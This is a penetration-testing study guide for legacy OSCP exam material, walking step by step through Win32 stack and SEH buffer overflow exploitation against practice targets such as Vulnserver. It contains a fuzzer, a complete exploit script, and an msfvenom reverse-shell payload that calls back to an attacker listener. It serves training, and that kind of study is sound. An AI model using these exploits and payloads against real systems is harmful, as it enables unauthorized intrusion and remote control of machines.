# Buffer Overflow / Exploit Development — Legacy OSCP Material (2026 Status)

> **Status: NOT on the current OSCP exam.** Buffer overflow exploitation was removed from both the PEN-200 course material and the exam body of knowledge in the **2023** course refresh — not the November 2024 restructure, an earlier and separate change. It has stayed removed through 2026. No BOF question exists on the current exam, and there is no guaranteed BOF machine.
>
> OffSec's stated rationale: *"while we firmly believe that basic exploit development provides an excellent mental toolset for penetration testers, we also recognize that... it's unlikely that vanilla buffer overflows will play any significant role in most penetration tests... we are moving them from the course to another area so that we can make room for more modern penetration testing subjects, primarily web, privilege escalation, and Active Directory content."* — OffSec, PEN-200 2023 course update
>
> The content was relocated, not deleted — it now lives in OffSec's dedicated **EXP-301 / OSED** (Windows User Mode Exploit Development) track. The workflow below remains valuable as foundational exploit-dev skill-building (and for community practice targets like Vulnserver/Brainpan), but **do not over-invest exam-prep time in it relative to AD and web/privesc content.**

*For authorized pentest/exam prep only.*

---

## Full Manual Win32 Stack Buffer Overflow Workflow

Standard Immunity Debugger + `mona.py` workflow. Target: Windows victim VM running the vulnerable app + Immunity Debugger + mona.py; attacker: Kali with Python + Metasploit tools.

### 1. Fuzzing
```python
import socket, sys, time
ip = "10.10.10.X"; port = 9999
buffer = "A" * 100
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(("TRUN /.:/" + buffer).encode())   # e.g. Vulnserver TRUN command
        s.close()
        time.sleep(1)
        buffer += "A" * 100
    except:
        print("Crashed at buffer length: " + str(len(buffer)))
        sys.exit(0)
```

### 2. Finding the EIP offset (cyclic pattern)
```bash
msf-pattern_create -l 3000
```
Send the 3000-byte pattern instead of `A`s. Read EIP from Immunity Debugger on crash, then:
```bash
msf-pattern_offset -q <EIP_value> -l 3000
```
(or in Immunity: `!mona findmsp -distance 3000`). Verify by rebuilding the buffer as `"A"*offset + "B"*4 + "C"*(rest)` and confirming EIP shows `42424242`.

### 3. Identifying bad characters
```
!mona bytearray -cpb "\x00"
```
Send `offset + "B"*4 + <full bytearray>`, let it crash, compare against the register-pointed memory:
```
!mona compare -f C:\mona\<app>\bytearray.bin -a <ESP/register address>
```
Add any byte mona reports as modified/truncating to the exclusion list (`-cpb "\x00\x0a\x0d"`) and repeat until it reports "unmodified."

### 4. Finding a JMP ESP (or CALL ESP) return address
```
!mona modules
```
Pick a loaded module with `ASLR`/`SafeSEH`/`Rebase`/`NXCompat` all `False`. Then:
```
!mona jmp -r esp -m essfunc.dll
```
Take the address, use it **little-endian** (e.g. `625011AF` → `\xAF\x11\x50\x62`).

### 5. Generating shellcode with msfvenom
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 \
  -b "\x00\x0a\x0d" -f c -e x86/shikata_ga_nai EXITFUNC=thread
```
Adjust `-b` to match the confirmed bad-character list.

### 6. Final exploit script
```python
import socket
ip = "10.10.10.X"; port = 9999
offset = 2003
eip = b"\xAF\x11\x50\x62"          # JMP ESP address, little-endian
nops = b"\x90" * 16
shellcode = b""                     # msfvenom output pasted here
padding = b"C" * (3000 - offset - len(eip) - len(nops) - len(shellcode))
buffer = b"A" * offset + eip + nops + shellcode + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
s.send(b"TRUN /.:/" + buffer)
s.close()
```
Set up a listener before firing: `nc -lvnp 4444`.

> **Exam note:** on the real OSCP exam, Metasploit/Meterpreter (including `multi/handler`) may be used against only **one** non-AD machine for the entire exam, and never to pivot. `msfconsole -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST ...; run"` is a valid alternative listener, but treat it as reference-only for that single permitted target — standardize on plain `nc -lvnp` for every other box, including all community practice targets in this doc.

---

## SEH-Based Overflow (when EIP isn't directly overwritten)

Some targets overwrite the SEH chain on crash instead of the saved return address directly (check Immunity's SEH pane / "SEH chain" — if it's corrupted with your pattern bytes instead of EIP, use this path).

### 1. Confirm SEH overwrite
Send the cyclic pattern as in step 2 above. If EIP is untouched but the SEH record is overwritten with pattern bytes, find both offsets:
```bash
msf-pattern_offset -q <nSEH_value> -l 3000   # offset to nSEH (4 bytes)
# SEH offset = nSEH offset + 4
```

### 2. Find a POP POP RET gadget (no SafeSEH module)
```
!mona modules            # find a module with SafeSEH = False
!mona seh                # lists POP POP RET gadgets across all non-SafeSEH modules
```
Pick an address with no bad chars, little-endian encode it (e.g. `625016F1` → `\xF1\x16\x50\x62`).

### 3. Build the buffer
Layout: `junk (offset) + nSEH (short jump) + SEH (POP POP RET addr) + shellcode`
```python
nseh = b"\xeb\x06\x90\x90"   # short jump 6 bytes forward, over the SEH field
seh  = b"\xF1\x16\x50\x62"   # POP POP RET address, little-endian
buffer = b"A" * offset + nseh + seh + b"\x90" * 16 + shellcode
```
On exception, the POP POP RET pops the two stack values pushed by the SEH dispatch, then RETs into `nseh`, which short-jumps past the 4-byte SEH field into the NOP sled/shellcode.

**Reference:** https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial/ (SEH section) · `!mona seh` docs: https://github.com/corelan/mona

---

## Tools Reference

| Tool | URL |
|---|---|
| Immunity Debugger | https://www.immunityinc.com/products/debugger/ |
| mona.py (Corelan) | https://github.com/corelan/mona |
| Metasploit pattern_create/pattern_offset | bundled: `/usr/share/metasploit-framework/tools/exploit/` |
| msfvenom | bundled with Metasploit Framework |
| nasm_shell.rb | bundled: `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb` |
| Vulnserver (practice target) | https://github.com/stephenbradshaw/vulnserver |
| Brainpan 1 VM (practice target) | https://www.vulnhub.com/entry/brainpan-1,51/ |

**Sources:** https://www.offsec.com/blog/pen-200-2023/ · https://www.offsec.com/courses/exp-301/
